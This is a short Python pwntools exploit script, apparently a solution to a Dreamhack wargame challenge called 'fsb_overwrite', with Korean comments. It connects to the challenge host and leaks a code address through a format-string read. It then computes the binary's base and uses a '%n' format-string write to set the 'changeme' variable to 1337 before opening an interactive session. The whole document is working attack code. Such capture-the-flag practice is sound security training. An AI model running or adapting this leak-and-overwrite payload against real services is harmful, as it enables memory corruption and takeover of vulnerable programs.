from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = remote('host3.dreamhack.games', 15720)
e = ELF('./fsb_overwrite')

#[1] Get Address of changeme
p.sendline(b'%15$p')
leak = int(p.recvline()[:-1], 16)
code_base = leak - 0x1293
changeme = code_base + e.symbols['changeme']

slog('code_base', code_base)
slog('changeme', changeme)

# [2] Overwrite changeme
payload = b'%1337c' # 1337을 min width로 하는 문자를 출력해 1337만큼 문자열이 사용되게 합니다.
payload += b'%8$n' # 현재까지 사용된 문자열의 길이를 8번째 인자(p64(changeme)) 주소에 작성합니다.
payload += b'A'*6 # 8의 배수를 위한 패딩입니다.
payload = payload + p64(changeme) # 페이로드 16바이트 뒤에 changeme 변수의 주소를 작성합니다.

p.sendline(payload)

p.interactive()
